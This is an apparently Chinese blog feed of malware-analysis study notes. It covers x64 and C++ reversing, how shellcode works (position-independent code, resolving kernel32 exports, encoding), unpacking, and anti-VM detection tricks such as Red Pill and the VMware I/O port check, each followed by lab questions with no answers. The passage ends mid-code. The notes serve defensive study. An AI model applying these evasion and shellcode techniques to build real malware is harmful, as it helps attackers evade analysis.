      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
      <tag>WriteUp</tag>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>64位恶意代码</title>
    <link href="/2019/04/64%E4%BD%8D%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    <url>/2019/04/64%E4%BD%8D%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>x64架构被设计成x86的升级，而指令集没有什么显著的区别，这本书年代久远，当时64位系统并没有普及，因此可能本章的内容并不是特别有价值。</p><p><strong>x64架构与x86的区别：</strong></p><ul><li>所有的地址和指针都是64位的</li><li>所有通用寄存器大小变大</li><li>通用寄存器的数目增长，新的寄存器位R8-R15</li><li>x64支持相对指令指针的数据寻址</li><li>。。。</li></ul><span id="more"></span><p><strong>x64调用约定和栈使用上的差别：</strong>64位系统使用的调用约定与32位中的<code>fastcall</code>调用约定最为相似，调用的前4个参数使用RCX、RDX、R8以及R9寄存器传递，额外的数据保存在栈上。在32位代码中，栈空间可以在函数中使用push和pop指令分配和释放，然而在64位代码中，函数不能在函数体的中间分配任何空间。由于这个特性，函数中间不会有push或者pop指令，这使分析人员更难判断一个函数有多少个参数，因为没有一个简明的方法说明一个内存地址是被作为栈变量使用还是一个函数的参数，同样也无法说明一个寄存器是否正在作为一个参数被使用。</p><p><strong>64位异常处理：</strong>不像32位系统中的异常处理，x64的结构化异常处理不再使用栈，在32位系统中fs:[0]被当作一个到当前异常处理器帧的指针使用，它被保存在栈上，以便每一个函数能够定义自己的异常处理器，但是这样可能会带来一些安全问题。因此在64位中结构化异常处理使用一个存储在PE文件中的静态异常信息表，并且不在栈上存储任何数据。同样<code>.pdata</code>节有一个<code>_IMAGE_RUNTIME_FUNCTION_ENTRY</code>结构是位可执行体中每一个函数准备的，它保存了这个函数的开始和末尾地址，以及指向那个函数异常处理的指针。</p><p><strong>在64位系统上的Windows32位</strong>：微软开发了一个子系统叫做<code>WOW64(Windows32 On Windows64)</code>用来保证32应用程序能在64位系统上运行。WOW64使用x64处理器的32位模式来执行指令，但是对于注册表和文件系统来说仍然需要解决方案，32位和53位进程必须有分开的DLL来避免冲突，因此system32中是64系统的DLL，WOW64中是32位的DLL。</p><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><h3 id="Lab-21-1"><a href="#Lab-21-1" class="headerlink" title="Lab 21-1"></a>Lab 21-1</h3><p><strong>问题</strong></p><p><strong>1.当你不带任何参数运行程序会发生什么？</strong></p><p><strong>2.根据你是用的IDA版本，main函数可能没有被自动识别，你如何对main函数的调用？</strong></p><p><strong>3.从0x0000000140001151地址到0x0000000140001161地址的指令在栈上存储了什么？</strong></p><p><strong>4.在不改变二进制程序文件名的前提下，如何让这个程序运行它真正的负载？</strong></p><p><strong>5.0x0000000140001205位置的strcmp函数调用比较了哪两个字符串？</strong></p><p><strong>6.0x00000001400013C8位置的函数接收哪些参数？</strong></p><p><strong>7.有多少个参数被传递给0x0000000140001093位置对CreatProcess函数的调用？你是如何知道的？</strong></p><h3 id="Lab21-2"><a href="#Lab21-2" class="headerlink" title="Lab21-2"></a>Lab21-2</h3><p><strong>分别在32位和64位系统中分析此文件。</strong></p><p><strong>问题</strong></p><p><strong>1.这个代码的资源节有什么有趣的东西？</strong></p><p><strong>2.这个恶意代码是为64位编译的还是32位？</strong></p><p><strong>3.恶意代码是如何识别处它处于的系统环境类型的？</strong></p><p><strong>4.与在32位系统中相比，恶意代码会在64位环境中做哪些不同的事情？</strong></p><p><strong>5.恶意代码会在x86环境下释放出哪些文件？你可以在哪里找到这些文件？</strong></p><p><strong>6.当运行在x64上时，恶意代码丢弃了哪些文件？你能在哪里找到这个或这些文件？</strong></p><p><strong>7.当运行在x64上时，恶意代码启动了什么类型的进程？</strong></p><p><strong>8.这个恶意代码的目的是什么？</strong></p><hr><h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
      <tag>恶意代码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C++代码分析</title>
    <link href="/2019/04/C-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <url>/2019/04/C-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><strong>面向对象的编程语言：</strong>和C语言不同C++是一种面向对象的编程语言，采用使用对象的编程模型，将数据与操作数据的函数都封装到对象中，在面向对象中，代码以叫做类Class的用户自定义的数据类型进行组织，类与结构体比较类似，差别在于他们另外保存函数信息而不仅仅是数据，类是创建一个对象的模板，它指定内存中的一个对象的函数与数据布局。</p><span id="more"></span><p><strong>this指针：</strong>数据与函数是对象关联的。为了访问一块是数据，你需要使用<code>ObjectName.variableName</code>的形式。函数以<code>ObjectName.functionName</code>的形式被简单调用，除了使用对象名访问变量以外还可以使用变量名访问当前对象的变量。<code>this</code>指针在一个不指定对象的函数中对每个变量访问时都是隐含的；它对每个对象函数都是一个隐含的参数。在微软生成的汇编代码中，<code>this</code>指针通常被传递到<code>ECX</code>寄存器中，有时也会使用<code>ESI</code>寄存器。使用this指针的<code>C++</code>调用叫做<code>thiscall</code>。</p><p><strong>重载与修饰：</strong><code>C++</code>支持一个被称为方法重载的编码结构，它能让多个函数使用同一个名字但接收不同的参数，编译器基于这个调用中的参数的个数与类型判断使用这个函数的哪个版本。C++使用名字修饰的字数来支持方法重载，为了支持重载，文件格式中的方法名经过了修改，这个名字中包含了参数信息，如一个名为Test的函数是<code>SimpleClass</code>的一部分，并且接受两个整数作为参数，那么这个方法名修饰之后就会叫：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">?Test@SimpleClass@@QAEXHH@Z<br></code></pre></td></tr></table></figure><p>IDA会根据此函数的修饰进行反修饰显示出原始的函数名和参数，然而内部函数名只有在代码中拥有符号时才可见。</p><p><strong>继承与函数重写：</strong>继承是一个面向对象编程的概念，在这个概念中父子关系在类之间建立。子类继承来自弗雷的函数和数据。一个子类会自动拥有所有父类的函数和数据，且经常定义额外的函数和数据。</p><p><strong>虚函数与非虚函数：</strong>虚函数是一个可以被子类重写的函数，并且它的执行是在运行时判断的，如果一个函数在父类中被定义，且在子类中也有一个同样名字的函数，那么子类的函数将会重写父类的函数。而在非虚函数中，这个要被执行的函数在编译时就会被确定。如果这个对象是一个父类的实例则这个父类的函数将被调用，即时这个对象在运行时属于子类，当虚函数在一个子类对象上被调用时，如果对象的父类是一个实例类型那么这个函数的子类版本可能被调用。</p><p><strong>虚函数表的使用：</strong>C++编译器会在编译代码时添加特殊的数据结构来支持虚函数，这些数据结构被称为虚函数表<code>vtables</code>，这些表时简单的函数指针的数组，每一个虚函数的类有它自己的虚函数表，且每一个类中的虚函数在虚函数表中都有一个项。</p><p><strong>识别虚函数表：</strong>虚函数表看起来向是函数指针的数组，当你看到一个虚函数表时，只有这个表中的第一个值有交叉引用。</p><p><strong>创建和销毁对象：</strong>C++类有两个特殊的函数构造函数和析构函数，构造函数在一个对象被创建的时候调用，析构函数在一个对象被销毁时调用，对象可以在栈上被创建也可以保存到堆上，对于在栈上创建的对象，没有必要位这个对象分配指定的内存，这个对象会简单地与其他局部变量一起保存在栈上。析构函数在对象离开作用于之后被自动调用，编译器可能要添加异常处理代码来保证对象的析构函数被调用。</p><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><h3 id="Lab20-01"><a href="#Lab20-01" class="headerlink" title="Lab20-01"></a>Lab20-01</h3><p><strong>第一个实验的目的是演示this指针如何使用。</strong></p><p><strong>问题</strong></p><p><strong>1.在0x401040处的函数采用了什么参数？</strong></p><p><strong>2.哪个URL被用来调用URLDownloadToFile？</strong></p><p><strong>3.这个程序做了什么事情？</strong></p><h3 id="Lab20-02"><a href="#Lab20-02" class="headerlink" title="Lab20-02"></a>Lab20-02</h3><p><strong>第二个实验的目的是演示虚函数。</strong></p><p><strong>问题</strong></p><p><strong>1.在这个程序中，你可以从有趣的字符串中了解到什么？</strong></p><p><strong>2.导入函数表告诉你关于这个程序的什么信息？</strong></p><p><strong>3.在0x40011D9处创建对象的目的是什么？它有什么虚函数吗？</strong></p><p><strong>4.哪个函数可能被宰0x401349处的call [edx]指令调用？</strong></p><p><strong>5.如何简易的搭建这个恶意代码所预料的服务器，不用连接到互联网就能完整地分析这个恶意代码呢？</strong></p><p><strong>6.这个程序的目的是什么？</strong></p><p><strong>7.这个程序中实现虚函数调用的目的是什么？</strong></p><h3 id="Lab20-03"><a href="#Lab20-03" class="headerlink" title="Lab20-03"></a>Lab20-03</h3><p><strong>第三个实验是一个长度更长也更现实的恶意代码，这个实验附带一个名为config.dat的配置文件。</strong></p><p><strong>问题</strong></p><p><strong>1.你可以在这个程序中得到什么有意思的字符串？</strong></p><p><strong>2.导入函数表告诉你关于这个程序的什么信息？</strong></p><p><strong>3.在0x4036F0处，存在一个以字符串Config error作为输入的函数调用，其后跟着一些指令，然后是一个对CxxThrowException的调用，除了这个字符串以外，这个函数还用到其他的参数了吗，这个函数返回了什么？从这个函数被使用的上下文中，你可以得到哪些信息？</strong></p><p><strong>4.在0x4025C8出的switch表中的6个项都做了什么？</strong></p><p><strong>5.这个程序的目的是什么？</strong></p><hr><h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
      <tag>恶意代码分析</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ShellCode分析</title>
    <link href="/2019/04/ShellCode%E5%88%86%E6%9E%90/"/>
    <url>/2019/04/ShellCode%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><strong>位置无关代码：</strong>PIC指不用硬编码地址来寻址指令或数据得代码，shellcode编写者应该使用位置无关代码来提高代码的兼容性。</p><p><strong>识别执行位置：</strong>Shellcode再以位置无关方式访问数据时需要引用一个基质指针，用这个基址指针加上或减去偏移值，将使它安全访问shellcode中包含的数据，因此一个通用寄存器应该首先载入当前EIP值，作为基址指针来使用，但是指令指针不能之别被软件访问，无法汇编<code>mov eax, eip</code>指令，但是可以使用<code>call/pop</code>指令和<code>fnstenv</code>指令。</p><p><strong>使用call&#x2F;pop指令：</strong>当一个call指令被执行使，处理器将call后面的指令地址压倒栈上，然后请求转到被请求的位置执行，这个函数执行完成后会执行一个ret指令，将返回地址弹出到栈的顶部，并将它载入EIP寄存器中，这样的结果使执行刚好返回到call后面的指令。因此shellcode可以通过call后面紧跟一个pop的方法来得到call后指令指针的方法。</p><span id="more"></span><p><strong>使用fnstenv指令：</strong>x87浮点单元（FPU）再普通的x86架构中提供给了一个隔离的执行环境，它包含一个单独的专用寄存器集合，当一个进程正在使用FPU指令浮点运算时，这些寄存器需要由操作系统再上下文切换时保存，<code>fnstenv</code>使用一个28字节的结构体存储FPU状态到内存中，有一处字符偏移量为<code>12</code>的<code>fpu_instruction_pointer</code>会保存FPU使用的最后一条的CPU指令的地址，并为一场处理器标识哪条FPU指令可能导致错误上下文信息，需要这个域是因为FPU是与CPU并行运行的，如果FPU产生了一个异常，一场处理器不能简单地通过参照中断返回地址来标识这个错误的指令。</p><p><strong>手动符号解析：</strong>shellcode 不能使用Windows加载器来确保所有的库加载并可用，它必须自己解决外部符号依赖，因此它经常使用LoadLibrarayA和GetProcAddress函数。因此shellcode需要完成</p><ul><li>在内存中找到kernel32.dll</li><li>解析kernel32.dll文件，并搜索以上两个导出函数。</li></ul><p><strong>在内存中找到kernel32.dll：</strong></p><p><img src="https://i.loli.net/2019/04/29/5cc6a4711e07b.png"></p><p>一旦找到了上图中kernel32.dll的基地址DllBase，通过跟踪内存中的几个结构体来解析kernel32.dll的符号。当定义一个文件内的位置时,PE文件使用RVA，导出数据被保存在IMAGE_EXPORT_DIRECTORY中，一个相对于IMAGE_EXPORT_DIRECTORY的RVA被保存在IMAGE_OPTIONAL_HEADER末尾部分的IMAGE_DATA_DIRECTORY结构体数组中。IMAGE_DATA_DIRECTORY数组的具体位置取决于这个PE文件是32位还是64位的。假设shellcode运行在32位平台上，所以在编译时从PE特征值域到IMAGE_DATA_DIRECTORY正确偏移的计算方式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">sizeof</span>(PE_Signature)+<span class="hljs-keyword">sizeof</span>(IMAGE_FILE_HEADER)+<span class="hljs-keyword">sizeof</span>(IMAGE_OPTIONAL_HEADER)=<span class="hljs-number">120</span>字节<br></code></pre></td></tr></table></figure><p>下图是IMAGE_EXPORT_DIRCTORY结构体中的相对域，AddressOfFunctions是一个RVA的数组，指向实际导出的函数。</p><p><img src="https://i.loli.net/2019/04/29/5cc6e2d794f96.png"></p><p>按照如下步骤可以找到一个符号的导出地址：</p><ul><li>迭代<code>AddressOfNames</code>数组查看每一个char *项，然后和需要的符执行一个字符串比较，直到找到一个匹配的项，我们将这个<code>AddressOfNames</code>的索引称为<code>AddressOfName iName</code>。</li><li>在<code>AddressOfNameOrdinals</code>数组中使用<code>iName</code>的索引，获取的值就是<code>iOrdinal</code>值。</li><li>使用<code>iOrdinal</code>索引到<code>Address OfFunctions</code>数组，获取到的值是被导出符号的RVA，最后将这个值返回给请求者。</li></ul><p><strong>使用散列过的导出符号名：</strong>当使用对每一个导出函数进行<code>strcmp</code>对比直到找出正确的函数名不适用<code>shellcode</code>大小受限的情况，shellcode大小受限时可以使用散列过的导出函数名来缩小<code>shellcode</code>大小。</p><p><strong>空指令雪橇：</strong>即<code>nop</code>指令<code>0x90</code>，但是有的编写者为了避免检测也会使用<code>0x40~0x4f</code>之间的值作为空指令。</p><p><strong>shellcode编码：</strong>有的程序可能会对<code>shellcode</code>的编码有一定的需求，不能出现坏字符如在字符串中出现<code>0x00</code>，或者要求所有字符都是可打印的（小于<code>0x80</code>）等，要绕过这些限制首先需要对<code>shellcode</code>进行编码，然后再<code>shellcode</code>中插入一个解码器，要保证解码器本身也能通过限制。下面时常用的编码技术：</p><ul><li>用常量字节掩码来<code>XOR</code>所有的载荷字节。</li><li>使用字母变换将一个字节分割成4个比特然后域一个可打印的ASCII字符相加等。</li></ul><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><h3 id="Lab19-1"><a href="#Lab19-1" class="headerlink" title="Lab19-1"></a>Lab19-1</h3><p><strong>使用shellcode_launcher.exe，分析文件。</strong></p><p><strong>问题</strong></p><p><strong>1.这段shellcode时如何编码的？</strong></p><p><strong>2.这段shellcode手动导入了哪个函数？</strong></p><p><strong>3.这段shellcode和哪个网络主机通信？</strong></p><p><strong>4.这段shellcode再文件系统上留下了什么迹象？</strong></p><p><strong>5.这段shellcode做了什么？</strong></p><h3 id="Lab19-2"><a href="#Lab19-2" class="headerlink" title="Lab19-2"></a>Lab19-2</h3><p><strong>文件Lab19-02.exe中包含一段shellcode，这个shellcode会被注入到另外一个进程并运行，请分析这个文件</strong></p><p><strong>问题</strong></p><p><strong>1.这段shellcode被注入到什么进程中？</strong></p><p><strong>2.这段shellcode位于哪里？</strong></p><p><strong>3.这段shellcode时如何被编码的？</strong></p><p><strong>4.这段shellcode手动导入了哪个函数？</strong></p><p><strong>5.这段shellcode和什么网络主机进行通信？</strong></p><p><strong>6.这段shellcode做了什么？</strong></p><h3 id="Lab19-3"><a href="#Lab19-3" class="headerlink" title="Lab19-3"></a>Lab19-3</h3><p><strong>问题</strong></p><p><strong>1.这个PDF中使用了什么漏洞？</strong></p><p><strong>2.这段shellcode是如何编码的？</strong></p><p><strong>3.这段shellcode手动导入了哪个函数？</strong></p><p><strong>4.这段shellcode再文件系统上留下了什么迹象？</strong></p><p><strong>5.这段shellcode做了什么？</strong></p><hr><h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
      <tag>恶意代码分析</tag>
      
      <tag>ShellCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>加壳与脱壳</title>
    <link href="/2019/04/%E5%8A%A0%E5%A3%B3%E4%B8%8E%E8%84%B1%E5%A3%B3/"/>
    <url>/2019/04/%E5%8A%A0%E5%A3%B3%E4%B8%8E%E8%84%B1%E5%A3%B3/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><strong>加壳原理：</strong>加壳器是将一个可执行文件作为输入，输出一个全新的可执行文件，被加壳的可执行文件经过压缩，加密或者其他转换。多数假客气采用压缩算法压缩原始文件，加壳器通过加密原始可执行文件并且实施一些反逆向技术的实现如防反汇编，反调试以及虚拟化等，加壳器既可以打包整个可执行文件，包括所有的数据与资源节，也可以仅打包代码和资源节。</p><p><strong>脱壳存根：</strong>可执行程序的入口点直线脱壳存根而不是原始代码，原始程序通常存储在杰克程序的一个或者多个附加的节中，脱壳存根负责脱壳源程序：</p><ul><li>将原始程序脱壳到内存中</li><li>解析原始可执行文件的所有导入函数</li><li>将可执行程序转移到原始的程序入口点</li></ul><span id="more"></span><p><strong>加载可执行文件：</strong></p><ul><li>读取PE头信息</li><li>根据头部信息为可执行文件的各个节分配内存&#x2F;根据脱壳存根在内存中分配空间</li><li>加载这些节到所分配的内存中</li></ul><p><strong>解析导入函数表：</strong>脱壳存根使用LoadLibrary导入每个库和GetProcAddress函数获取每个函数的内存地址。</p><p><strong>尾部跳转：</strong>一旦脱壳存根完成脱壳，就必须转到OEP运行，一般使用jmp指令，或者使用ret或者call指令。有时恶意代码会使用操作系统转移控制的函数来掩盖尾部跳转NtContinue或者Nwcontinue。</p><p><strong>加壳程序的特点：</strong></p><ul><li>程序中导入函数很少，导入函数只有LoadLibrary、GetProcAddress</li><li>使用IDA分析时IDA仅能识别出少量的代码</li><li>使用OD打开程序时警告此程序可能被加壳</li><li>程序节中包含加壳器的标识如UPX0</li><li>程序拥有不正常的节大小</li><li>使用PEID等加壳探测程序</li></ul><p><strong>熵计算：</strong>熵值是一种测量系统中或程序中混乱程序的技术，压缩或者加密数据更接近于随机数据因此熵值更高。</p><p><strong>脱壳选项：</strong></p><ul><li>自动静态脱壳</li><li>自动动态脱壳</li><li>手动动态脱壳</li></ul><p><strong>手动脱壳：</strong></p><ul><li>找到加壳算法，编写程序逆向算法，缺点是效率较低</li><li>运行脱壳存根，等脱壳完成后修改PE头部</li></ul><p><strong>修复导入函数表：</strong>ImpRec可以用来修复一个加壳程序的导入表：</p><ul><li>打开要修复的文件</li><li>输入OEP地址的偏移</li><li>单击IAT autoresearch按钮</li><li>单击Import</li><li>导入成功则显示valid:yes</li></ul><p><strong>使用自动工具查找OEP：</strong>使用OD中的插件OllyDump，通过Section Hop调用Find OEP。通常吗脱壳存根存在一个节里，而可执行程序被打包到另一个节中，使用step-into或者step-over方法，当城市从一个节跳转到另一个节时，OD可以探测到这种转移并在转移的地方进行中断。</p><p><strong>手动查找OEP：</strong></p><ul><li>最简单的手动查找策略就是查找尾部跳转指令，通常情况下是jmp指令或者是ret。通常尾部跳转指令时一串无效字节指令前的最后一条有效指令，填充这些字节的目的是为了保证字节对齐。</li><li>尾部跳转指令的另一个显著特征是跳转地址的大小，一般跳转指令被用在条件分支中，因此跳转的距离较小，但是尾部跳转指令距离很大。</li><li>观察jmp指向的指令序列，在程序运行前jmp指向的地址并没有有意义的指令但是脱壳存根运行之后则会出现有意义的指令。</li><li>另一个查找尾部跳转的方式是在栈上设置读断点，要设置读断点必须使用硬件断点或者OD的内存断点，反汇编中的发不分寒暑都是以某种push指令开头的，在栈中记录第一个入栈的内存地址，然后在这个栈位置设置一个读断点，然后当脱壳存根运行完成之后会用pop指令再次命中这个栈位置，这个是ESP守恒定律</li><li>如果程序通过使用 call指令来跳转到OEP时，这个call并没有ret，因此在这个call上使用step-over会让你前功尽弃，因为无法命中下一个断点，需要重新寻找刚才的函数并替换为step-into。</li><li>在GetProcAddress函数设置断点，大多数脱壳器使用此函数来解析原始函数的导出表。</li><li>对于命令行知程，在进程中，壳很在就调用了GetVersion和GetCommandlineA函数，所以你可以尝试在这些函数被调用时中断程序。</li><li>在GUI程序中GetMoudleHandleA通常是第一个被调用的函数，程序中断后，检查前一个栈帧没查看何处调用了原始程序，调用GetMoudlehandleA和GetVersion函数的开始地址一般就是OEP。</li><li>使用OD的RunTrace选项，此选项提供一些额外的断点选项使你能在较大的的范围内设置断点，例如有很多壳都会留下原始文件的text节，通常硬盘上的text节没有任何东西，但是这个节被保留在PE头部使得加载器能够危他创建内存空间，OEP总是位于源文件的text节中，通常它是这个节中第一个被调用的指令，RunTrace可以实现无论何时执行text中的指令，都能触发RunTrace设置的断点，一旦断点触发就找到了OEP。</li></ul><p><strong>手动修复导入表：</strong>导入表在内存中实际上有两个表，第一个表时函数名称或者序列号表，起哄包含加载器或脱壳存根所需要的函数名称或者序号，第二个表时所有导入函数的地址列表，当代码运行时，只需要第二个表，所以加壳程序可以通过移除名字阻止分析，在这种情况下需要手动重构这个表。</p><p>常见壳：</p><ul><li>UPX：这是一款主要实现压缩可执行文件大小功能的壳，可以使用UPX的托克工具脱壳，遇到修改过的UPX可以查找OEP实现手动脱壳。</li><li>PECompact：这是一个商业壳，为性能和速度而设计，这个壳脱起来比较难，因为其中包含反调试异常与混淆代码，绕过异常的方式是将异常返还给程序处理，可以通过尾部跳转指令来查找OEP，step-over几个函数，然后会看到一个尾部跳转，它由一个jmp eax指令组成，之湖是多个0x00字节。</li><li>ASPack：此壳的目的是为了安全，使用了自我修改代码，使设置断点和分析变得困难，在用ASPack加过壳的程序上设置断点可能会立刻终止此程序，打开脱壳存根的代码会有一个PUSHA指令，确定用来存在寄存器的栈地址，然后再这些地址上设置硬件断点，调用POPAD指令时会触发硬件断点，OEP就在离尾部跳转的不远处。</li><li>Petite：与ASPack相似，有反调试机制，且为了干扰调试器使用了单步异常，同样需要将异常处理返还给程序，使用栈上的硬件断点使最佳策略来寻找OEP。</li><li>WinUpack：这是一个拥有GUI的壳，设计目的是优化压缩而不是安全，查找Upack的OEP最好方法是再GEtProcAddress上设置断点查找设置导入解析函数的循环。</li><li>Themida：这是一个非常复杂的壳，有反调试与反逆向分析的功能。同时阻止VMware、调试器以及ProcMon分析。除此之外Themida有一个内核模块。与多数壳不同Themida会在原始程序运行后一直运行，可以找到一些针对这个壳的自动脱壳工具，如果自动脱壳失败则需要用到ProcDump工具来将内存中的数据Dump下来。</li></ul><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><p><strong>本章每一个实验都是前面章节实验的加壳版本，你的任务是脱壳这个文件并且识别这些文件在哪一章出现过。分析样本文件Lab18-01.exe到Lab18-05.exe。</strong></p><h3 id="Lab18-01"><a href="#Lab18-01" class="headerlink" title="Lab18-01"></a>Lab18-01</h3><h3 id="Lab18-02"><a href="#Lab18-02" class="headerlink" title="Lab18-02"></a>Lab18-02</h3><h3 id="Lab18-03"><a href="#Lab18-03" class="headerlink" title="Lab18-03"></a>Lab18-03</h3><h3 id="Lab18-04"><a href="#Lab18-04" class="headerlink" title="Lab18-04"></a>Lab18-04</h3><h3 id="Lab18-05"><a href="#Lab18-05" class="headerlink" title="Lab18-05"></a>Lab18-05</h3><hr><h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
      <tag>恶意代码分析</tag>
      
      <tag>加壳与脱壳</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反虚拟机技术</title>
    <link href="/2019/04/%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8A%80%E6%9C%AF/"/>
    <url>/2019/04/%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>恶意代码编写者经常使用反虚拟机技术逃避分析，恶意代码可以使用这种技术探测自己是否运行在虚拟机中。</p><p><strong>VMware痕迹：</strong>VM虚拟环境在系统中遗留了很对痕迹，特别是在安装Vmtools之后，恶意代码可以通过存在于操作系统文件系统、注册表和进程列表中标记痕迹，探测VM虚拟环境的存在。</p><p>安装<code>VMtools</code>的主机上通常会运行三个相关进程：<code>VMwareService.exe</code>、<code>VMwareTray.exe</code>、<code>VmwareUser.exe</code>。恶意代码在进程列表中中搜索带有<code>VMware</code>字符串的进程，就能找到这些进程。</p><span id="more"></span><p><strong>绕过痕迹检测：</strong></p><ul><li>在调试过程中修补二进制代码，使某些位置的跳转永远不会执行</li><li>在十六进制编辑器中修改对比的字符串</li><li>卸载<code>VMwareTools</code></li></ul><p><strong>探测内存痕迹：</strong>搜索整个物理内存中存在的VMware字符串可能会搜索出上百个相关字符串。</p><p><strong>查找漏洞指令：</strong>虚拟机监视器VMM监视虚拟机的运行，它运行在宿主操作系统并未客户机操作系统提供一个完整的虚拟平台，但是与此同时，VMM也有一些可以被恶意代码探测到的虚拟化安全缺陷。</p><p>在内核模式下，VMware使用二进制翻译技术进行指令的模拟。运行在内核态的某些特权指令被解释和模拟，所以他们不在物理处理器上运行，相反，在用户模式下，代码直接在处理器运行，几乎所有与硬件交互的指令，要么使特权指令，要么使会产生内核态陷阱指令或中断指令。VMware解惑所有中断并处理他们，以便虚拟机认为这是一个正常的机器。</p><p>然而在x86体系结构中，一些指令在获取硬件相关的信息使并不产生异常，如<code>sidt</code>、<code>sgdt</code>、<code>sldt</code>、<code>cpuid</code>等，为了正确虚拟这些指令，VMware需要在所有指令上进行二进制翻译，因此造成巨大的性能损失，为了避免执行全指令模拟造成的巨大性能损失，VMware会允许一些特定的指令在没有正确虚拟化的前提下运行，这意味着某些指令序列在VMware而不是在物理机运行时返回不同的结果。处理器使用某些关键的结构与表，他们会被加载与真实系统不同的偏移量，而这正式未进行全虚拟化的副作用，中断描述表是CPU内部的一个数据结构，操作系统使用它来确保正确响应和中断、异常。所有内存的获取是通过全局描述表GDT获得，或是通过本地描述表LDT获得，这些表中包含段描述符，他们提供每一个段的详细存取信息，其中包含段基址的类型长度以及存取权限等。</p><p>有三条敏感指令可以读取这些表的位置：<code>sigt</code>、<code>sgdt</code>、<code>sldt</code>，并将相应的寄存器存入内存地址。虽然这些指令通常情况下由操作系统使用，但是在x86体系下可以在用户空间中执行，x86处理器中只有三个寄存器来存储这三个表的位置，因此这些寄存器的值必须对底层宿主操作系统有效，同时，他们派哪里了虚拟操作系统的与气质，因为这三个指令可以随时被用户态的代码调用，并且不会产生陷阱，也未被VMware正确虚拟化，因此这些异常都可以用来检测VMware的存在。</p><p><strong>使用Red Pill反虚拟机技术：</strong>通过运行<code>sidt</code>指令获取<code>IDTR</code>的值，虚拟机监视器必须重定位Guest系统的<code>IDTR</code>，来避免与HOST系统的<code>IDTR</code>冲突，因为在虚拟机中运行<code>sidt</code>指令时，虚拟机监视器不会被通知，所以返回虚拟机的<code>IDTR</code>。<code>Red Pill</code>技术通过检测这种差异性来检测是否处在虚拟环境中。</p><p>此方法一般只对单核处理器有效，因为每个处理器都有自己的<code>IDTR</code>。绕过此检测的方法是将<code>sidt</code>指令替换为<code>nop</code>。</p><p><strong>使用No Pill指令：</strong><code>sgdt</code>和<code>sldt</code>指令检测技术称为<code>No Pill</code>，此技术基于<code>LDT</code>结构是由处理器分配而不是由操作系统分配的这个事实，正常情况下Windows不会使用<code>LDT</code>结构，但是VMware为<code>LDT</code>提供了虚拟化支持，在物理集中LDT的值为<code>0</code>而在虚拟环境中为非零值，防止此检测方法的操作是禁用虚拟机加速。</p><p><strong>查询I&#x2F;O通信接口：</strong>这是一种时下最流行的虚拟机检测技术，VMware使用虚拟化IO接口来完成宿主主机与虚拟机之间的通信，这个端口可以被查询，然后与一个神秘数进行比较，这个技术成功的关键在与in指令，他从一个源操作数指定的端口复制数据到目的操作数制定的内存地址，VMware会监视in指令的执行，并不会目的通信通道端口为<code>0x5668（VX）</code>的IO数据。VMware会检查第二个操作数是否为VX，如果是则EAX寄存器载入的值是<code>0x564D5868</code>（VMXh），ECX寄存器中必须载入你希望在端口上执行响应操作的值如<code>0xA</code>可以获得VMware的版本。绕过此检测的方法是将in指令替换为<code>nop</code>。</p><p><strong>使用str指令：</strong>str指令用来从任务寄存器中检索段选择子，段选择子之心昂当前运行任务的状态段（TSS），这条指令的返回值在虚拟机系统和物理机上不同（此技术对多处理器的硬件无效）。</p><p>在IDA中高亮显示反虚拟机代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 